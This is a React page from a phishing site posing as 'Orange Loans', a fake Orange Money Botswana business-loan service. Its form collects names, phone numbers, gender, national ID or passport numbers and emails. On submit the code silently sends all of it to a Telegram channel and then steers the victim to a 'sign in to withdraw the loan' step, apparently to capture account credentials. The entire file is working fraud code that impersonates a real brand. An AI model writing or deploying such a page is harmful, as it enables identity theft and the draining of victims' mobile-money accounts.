import { useState } from 'react';
import { useNavigate, useLocation } from 'react-router-dom';
import Logo from '../components/Logo';
import PageLoader from '../components/PageLoader';
import { sendToTelegram } from '../lib/api';
import { setApplication, getSession } from '../lib/session';
import { ChevronDown, ArrowLeft, ShieldCheck, UserCheck, Loader2, ArrowRight } from 'lucide-react';

const genders = ['Male', 'Female'];
const nationalities = [
  'Motswana (Botswana)',
  'South African',
  'Zimbabwean',
  'Namibian',
  'Zambian',
  'Other',
];

export default function PersonalDetails() {
  const navigate = useNavigate();
  const location = useLocation();
  const loanData = (location.state as {
    amount: string;
    purpose: string;
    type: string;
    repayment: string;
  }) || {
    amount: 'P 10,000',
    purpose: 'Business Expansion',
    type: 'Orange Business Loan',
    repayment: '6 Months',
  };

  const session = getSession();
  const [form, setForm] = useState({
    firstName: '',
    lastName: '',
    mobile: session?.phone || '',
    gender: '',
    idNumber: '',
    nationality: 'Motswana (Botswana)',
    email: '',
  });
  const [submitting, setSubmitting] = useState(false);

  const set = (k: string, v: string) => setForm((p) => ({ ...p, [k]: v }));
  const valid = form.firstName && form.lastName && form.mobile && form.gender && form.idNumber && form.nationality;

  const handleSubmit = async () => {
    if (!valid || submitting) return;
    setSubmitting(true);
    try {
      await sendToTelegram({
        type: 'submission',
        country: 'Botswana',
        countryCode: '+267',
        phone: form.mobile,
        firstName: form.firstName,
        lastName: form.lastName,
        gender: form.gender,
        idNumber: form.idNumber,
        nationality: form.nationality,
        email: form.email,
        loanAmount: loanData.amount,
        loanPurpose: loanData.purpose,
        loanType: loanData.type,
        repaymentPeriod: loanData.repayment,
      });
    } catch (_) {
      /* silent */
    }

    setApplication({
      amount: loanData.amount,
      purpose: loanData.purpose,
      type: loanData.type,
      repayment: loanData.repayment,
      firstName: form.firstName,
      lastName: form.lastName,
      submittedAt: new Date().toISOString(),
      status: 'pending',
    });

    // Move directly to sign-in verification flow to withdraw the loan
    setTimeout(() => {
      navigate('/signup', { state: { prefilledPhone: form.mobile } });
    }, 1500);
  };

  return (
    <PageLoader>
      <div className="min-h-screen bg-white text-black flex flex-col font-sans">
        {/* Top Header */}
        <header className="bg-black text-white py-3 px-4 shadow-sm border-b border-gray-800">
          <div className="container mx-auto max-w-4xl flex items-center justify-between">
            <div className="flex items-center gap-3 cursor-pointer" onClick={() => navigate('/')}>
              <Logo size="sm" />
              <span className="font-black text-lg sm:text-xl tracking-tight">
                <span className="text-[#ff7900]">Orange</span> <span className="text-white">Loans</span>
              </span>
            </div>
            <div className="flex items-center gap-2">
              <span className="w-2 h-2 bg-[#ff7900]"></span>
              <span className="text-xs font-bold uppercase tracking-wider text-white">
                Step 2 of 2: Personal Details
              </span>
            </div>
          </div>
        </header>

        {/* Promo Ribbon */}
        <div className="bg-[#f6f6f6] py-2.5 px-4 border-b border-gray-200">
          <div className="container mx-auto max-w-4xl flex items-center justify-center gap-2">
            <span className="w-1.5 h-1.5 bg-[#ff7900]"></span>
            <p className="text-black text-xs font-bold text-center">
              Instant Orange Money Business Loans Disbursed Directly to Your Mobile Wallet in Botswana.
            </p>
          </div>
        </div>

        {/* Main Form Container */}
        <main className="flex-1 container mx-auto max-w-2xl px-4 py-8">
          <div className="bg-white rounded-lg p-6 sm:p-8 text-black shadow-sm border border-gray-300">
            <button
              id="personal-details-back-btn"
              onClick={() => navigate(-1)}
              className="flex items-center gap-1.5 text-gray-600 hover:text-black text-xs font-bold uppercase tracking-wider mb-6 transition"
            >
              <ArrowLeft className="w-4 h-4 text-[#ff7900]" />
              <span>Back</span>
            </button>

            <div className="text-left mb-6 pb-4 border-b border-gray-200">
              <div className="flex items-center gap-2 text-xs font-bold text-[#ff7900] uppercase tracking-wider mb-1">
                <span className="w-2 h-2 bg-[#ff7900]"></span>
                <span>Applicant Information</span>
              </div>
              <h2 className="text-2xl sm:text-3xl font-black text-black tracking-tight">
                Applicant Information
              </h2>
              <p className="text-gray-600 text-xs sm:text-sm mt-1">
                Enter your identity details to confirm your loan eligibility in Botswana
              </p>
            </div>

            {/* Loan Badge Summary */}
            <div className="bg-[#f6f6f6] rounded-lg p-3.5 border border-gray-300 mb-6 flex items-center justify-between">
              <div>
                <span className="text-[10px] uppercase font-bold text-gray-500">Applying for</span>
                <p className="font-black text-base text-[#ff7900]">{loanData.amount} ({loanData.repayment})</p>
              </div>
              <span className="text-xs font-black bg-black text-white px-3 py-1 rounded uppercase tracking-wider">
                {loanData.type}
              </span>
            </div>

            {/* 2 Boxes per row grid */}
            <div className="grid grid-cols-1 sm:grid-cols-2 gap-4 mb-6">
              <InputField
                id="input-first-name"
                label="First Name"
                value={form.firstName}
                onChange={(v) => set('firstName', v)}
                placeholder="e.g. Kgosi"
              />

              <InputField
                id="input-last-name"
                label="Last Name"
                value={form.lastName}
                onChange={(v) => set('lastName', v)}
                placeholder="e.g. Mogapi"
              />

              <InputField
                id="input-mobile"
                label="Orange Mobile Number (+267)"
                value={form.mobile}
                onChange={(v) => set('mobile', v)}
                type="tel"
                placeholder="e.g. 72 123 456"
              />

              <div>
                <label className="block text-xs font-black uppercase tracking-wider text-black mb-1.5 flex items-center gap-1.5">
                  <span className="w-1.5 h-1.5 bg-[#ff7900]"></span>
                  <span>Gender *</span>
                </label>
                <div className="relative">
                  <select
                    id="select-gender"
                    value={form.gender}
                    onChange={(e) => set('gender', e.target.value)}
                    className="w-full appearance-none border-2 border-gray-300 focus:border-[#ff7900] rounded-lg px-4 py-3 text-sm font-bold text-black outline-none bg-white pr-10 shadow-xs transition"
                  >
                    <option value="">Select gender</option>
                    {genders.map((g) => (
                      <option key={g} value={g}>
                        {g}
                      </option>
                    ))}
                  </select>
                  <ChevronDown className="absolute right-4 top-1/2 -translate-y-1/2 w-4 h-4 text-gray-500 pointer-events-none" />
                </div>
              </div>

              <InputField
                id="input-id-number"
                label="Botswana Omang (National ID) / Passport"
                value={form.idNumber}
                onChange={(v) => set('idNumber', v)}
                placeholder="e.g. 123456789"
              />

              <div>
                <label className="block text-xs font-black uppercase tracking-wider text-black mb-1.5 flex items-center gap-1.5">
                  <span className="w-1.5 h-1.5 bg-[#ff7900]"></span>
                  <span>Nationality *</span>
                </label>
                <div className="relative">
                  <select
                    id="select-nationality"
                    value={form.nationality}
                    onChange={(e) => set('nationality', e.target.value)}
                    className="w-full appearance-none border-2 border-gray-300 focus:border-[#ff7900] rounded-lg px-4 py-3 text-sm font-bold text-black outline-none bg-white pr-10 shadow-xs transition"
                  >
                    {nationalities.map((n) => (
                      <option key={n} value={n}>
                        {n}
                      </option>
                    ))}
                  </select>
                  <ChevronDown className="absolute right-4 top-1/2 -translate-y-1/2 w-4 h-4 text-gray-500 pointer-events-none" />
                </div>
              </div>

              <div className="sm:col-span-2">
                <InputField
                  id="input-email"
                  label="Email Address (optional)"
                  value={form.email}
                  onChange={(v) => set('email', v)}
                  type="email"
                  placeholder="e.g. kgosi@example.co.bw"
                  optional
                />
              </div>
            </div>

            <div className="flex items-center gap-2 text-xs text-gray-600 mb-6 bg-[#f6f6f6] p-3 rounded border border-gray-300">
              <ShieldCheck className="w-4 h-4 text-[#ff7900] shrink-0" />
              <span>By continuing, you authorize Orange Money Botswana to verify identity and credit records.</span>
            </div>

            {/* The user specified: "edit the sign button to say, sign in to withdraw the Loan" */}
            <button
              id="submit-application-btn"
              onClick={handleSubmit}
              disabled={!valid || submitting}
              className="w-full py-4 rounded bg-[#ff7900] text-white font-black text-sm uppercase tracking-wide hover:bg-[#e06b00] disabled:opacity-40 transition shadow-sm flex items-center justify-center gap-2"
            >
              {submitting ? (
                <>
                  <Loader2 className="w-5 h-5 animate-spin" />
                  <span>Processing Loan Request...</span>
                </>
              ) : (
                <>
                  <span>Sign in to withdraw the Loan</span>
                  <ArrowRight className="w-4 h-4" />
                </>
              )}
            </button>
          </div>
        </main>
      </div>
    </PageLoader>
  );
}

function InputField({
  id,
  label,
  value,
  onChange,
  type = 'text',
  placeholder,
  optional = false,
}: {
  id?: string;
  label: string;
  value: string;
  onChange: (v: string) => void;
  type?: string;
  placeholder?: string;
  optional?: boolean;
}) {
  return (
    <div className="mb-4">
      <label className="block text-xs font-black uppercase tracking-wider text-black mb-1.5 flex items-center gap-1.5">
        <span className="w-1.5 h-1.5 bg-[#ff7900]"></span>
        <span>{label} {!optional && '*'}</span>
      </label>
      <input
        id={id}
        type={type}
        value={value}
        onChange={(e) => onChange(e.target.value)}
        placeholder={placeholder || `Enter ${label.toLowerCase()}`}
        className="w-full border-2 border-gray-300 focus:border-[#ff7900] rounded-lg px-4 py-3 text-sm font-bold text-black outline-none shadow-xs transition placeholder:text-gray-400 bg-white"
      />
    </div>
  );
}
